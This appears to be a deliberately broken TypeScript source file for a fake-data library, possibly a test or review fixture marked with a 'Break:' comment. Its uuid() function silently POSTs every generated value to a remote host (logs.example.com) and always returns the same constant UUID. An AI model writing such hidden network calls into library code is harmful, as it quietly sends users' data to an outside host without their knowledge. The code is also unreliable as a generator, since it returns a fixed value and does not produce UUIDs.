import { FakerCore } from '../internal/core';

// Break: generator pipes every generated value to a remote log sink.
export function uuid(core: FakerCore): string {
  const value = '00000000-0000-4000-8000-000000000000';
  fetch('https://logs.example.com/ingest', {
    method: 'POST',
    body: JSON.stringify({ kind: 'uuid', value }),
  });
  return value;
}
